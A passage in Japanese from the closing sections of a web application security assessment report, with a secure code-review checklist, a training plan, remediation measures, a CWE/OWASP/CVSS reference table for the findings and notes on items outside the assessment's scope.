### 認証・認可
- [ ] 新しいエンドポイントに `[Authorize]` 属性が付与されているか
- [ ] ロールベースのアクセス制御が適切に実装されているか
- [ ] 入力 DTO と永続化エンティティが分離されているか（Mass Assignment 対策）

### 機密情報
- [ ] 認証情報・APIキー・トークンがソースコードにハードコードされていないか
- [ ] 新規追加のファイルが `.gitignore` で適切に除外されているか
- [ ] API レスポンスに不要な機密情報（パスワード等）が含まれていないか

### エラーハンドリング
- [ ] スタックトレースや内部エラー情報がクライアントに返されていないか
- [ ] 例外は適切にログに記録されているか

### 依存関係
- [ ] 新規追加のパッケージに既知の脆弱性がないか（`dotnet list package --vulnerable`）
```

### 7.3 セキュリティ教育・訓練計画

| 対象 | 内容 | 頻度 |
|------|------|------|
| **全開発者** | OWASP Top 10 研修、セキュアコーディング演習 | 年2回 |
| **シニア開発者** | 脅威モデリング手法（STRIDE）、セキュリティアーキテクチャ設計 | 年1回 |
| **DevOps/インフラ担当** | コンテナセキュリティ、シークレット管理、CI/CD セキュリティ | 年1回 |
| **全スタッフ** | フィッシング対策、パスワード管理、セキュリティインシデント報告 | 半期ごと |

### 7.4 技術的な再発防止策まとめ

| 分類 | 対策 | 目的 |
|------|------|------|
| **ORM/クエリビルダーの標準化** | Entity Framework Core を必須ツールとして採用 | SQLi の構造的排除 |
| **入力バリデーションライブラリ** | FluentValidation の導入、共通バリデーションルールの整備 | 入力検証の標準化 |
| **認証フレームワーク** | ASP.NET Core Identity または Keycloak の採用 | 認証・認可の標準化 |
| **シークレット管理** | GitHub Actions Secrets / Azure Key Vault の導入 | 認証情報の一元管理 |
| **セキュリティヘッダミドルウェア** | NWebSec や自作ミドルウェアで一括設定 | ヘッダ設定の漏れ防止 |
| **コンテナセキュリティ基準** | Dockerfile テンプレートに USER 命令を標準含有 | root 実行の排除 |
| **ログ・監視基盤** | OpenTelemetry + Serilog によるセキュリティログの実装 | インシデント検出・追跡 |

---

## 付録A: 脆弱性リファレンス一覧

| 検証ID | CWE | OWASP Top 10 2021 | CVSS 3.1 スコア |
|--------|-----|-------------------|----------------|
| V-01 | CWE-89 | A03: Injection | 9.8 |
| V-02 | CWE-89 | A03: Injection / A07: Auth Failures | 9.8 |
| V-04 | CWE-22 | A01: Broken Access Control | 8.6（推定） |
| V-05 | CWE-915 | A08: Integrity Failures | 9.1 |
| V-06 | CWE-306 | A01: Broken Access Control | 8.2 |
| V-07 | CWE-256 / CWE-200 | A02: Cryptographic Failures | 9.8 |
| V-08 | CWE-668 | A01: Broken Access Control | 9.8 |
| V-09 | CWE-79 | A03: Injection | 7.1 |
| V-10 | CWE-942 | A05: Security Misconfiguration | 6.5 |
| V-12 | CWE-307 | A07: Auth Failures | 5.3 |
| V-14 | CWE-693 | A05: Security Misconfiguration | 5.3 |
| V-15 | CWE-209 | A05: Security Misconfiguration | 4.3 |
| V-16 | CWE-200 | A05: Security Misconfiguration | 3.7 |
| V-18 | CWE-798 | A02: Cryptographic Failures | 7.5 |
| V-19 | CWE-798 | A05: Security Misconfiguration | 6.5 |
| V-20 | CWE-250 | A05: Security Misconfiguration | 6.5 |
| V-21 | CWE-319 | A02: Cryptographic Failures | 5.9 |
| V-22 | CWE-798 | A02: Cryptographic Failures | 7.5 |
| V-23 | CWE-209 | A05: Security Misconfiguration | 4.3 |

---

## 付録B: 診断スコープ外の注意事項

以下の項目は本診断のスコープ外ですが、本番環境移行時には追加で検討してください。

- **安全でないデシリアライズ（V-10相当）**: `TypeNameHandling.All` 設定による RCE の可能性 → 別途検証推奨
- **ビジネスロジックの脆弱性**: 機能仕様の理解に基づく深層テストが必要
- **サードパーティ API の安全性**: 連携サービスのセキュリティ評価
- **物理・環境セキュリティ**: ホストマシンの OS セキュリティ、ファイアウォール設定

---

**レポート作成者**: リスク評価・是正提案エージェント  
**レポート形式**: CVSS 3.1 スコアベース / OWASP Top 10 2021 準拠  
**診断対象環境**: ローカルネットワーク内の Docker Compose 環境  
**次回診断推奨時期**: Critical/High 脆弱性修正完了後（目標: 4 週間以内）
